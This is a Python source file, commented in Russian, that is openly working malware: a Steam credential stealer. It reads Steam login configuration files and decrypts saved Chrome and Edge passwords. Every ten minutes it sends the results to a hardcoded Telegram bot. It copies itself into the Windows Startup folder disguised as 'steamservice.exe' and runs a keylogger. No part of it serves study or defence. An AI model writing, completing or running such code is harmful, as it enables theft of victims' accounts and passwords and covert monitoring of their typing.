import os
import re
import requests
import json
import shutil
from threading import Timer
import sys
from pynput.keyboard import Listener

# === НАСТРОЙКИ TELEGRAM ===
BOT_TOKEN = "8122491431:AAHbgSr_fX90putlg3YboVfWqalJn_ELpoo"  # Заменить на токен от @BotFather
CHAT_ID = "7605336105"      # Ваш chat_id (узнать у @userinfobot)

# === ПЕРЕХВАТ ДАННЫХ STEAM ===
def steal_steam_creds():
    steam_paths = [
        os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "config", "loginusers.vdf"),
        os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "config", "config.vdf"),
    ]
    
    stolen_data = ""
    
    for path in steam_paths:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    stolen_data += f"\n\n📂 Файл: {path}\n" + f.read()
            except:
                pass
    
    # Поиск сохраненных паролей в кеше браузеров (Chrome, Edge)
    try:
        from win32crypt import CryptUnprotectData
        import sqlite3
        
        browser_paths = [
            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        ]
        
        for path in browser_paths:
            if os.path.exists(path):
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pass_encrypted in cursor.fetchall():
                    try:
                        decrypted = CryptUnprotectData(pass_encrypted)[1]
                        if "steam" in url.lower():
                            stolen_data += f"\n\n🔑 Steam (браузер):\nURL: {url}\nЛогин: {user}\nПароль: {decrypted.decode('utf-8')}"
                    except:
                        pass
    except:
        pass
    
    return stolen_data

# === ОТПРАВКА В TELEGRAM ===
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {
        "chat_id": CHAT_ID,
        "text": message
    }
    requests.post(url, params=params)

# === ЗАПУСК КРАЖИ ===
def collect_and_send():
    steam_data = steal_steam_creds()
    if steam_data:
        send_to_telegram(f"🔥 Украденные данные Steam:\n{steam_data}")
    
    # Повтор каждые 10 минут
    Timer(600, collect_and_send).start()

# === АВТОЗАГРУЗКА ===
def add_to_startup():
    startup_path = os.path.join(
        os.getenv("APPDATA"),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
        "steamservice.exe"
    )
    if not os.path.exists(startup_path):
        shutil.copyfile(sys.argv[0], startup_path)

# === ЗАПУСК ===
if __name__ == "__main__":
    add_to_startup()
    Timer(10, collect_and_send).start()  # Первая отправка через 10 сек
    
    # Дополнительно: keylogger для паролей, введенных вручную
    with Listener(on_press=lambda key: open("keylog.txt", "a").write(str(key))) as listener:
        listener.join()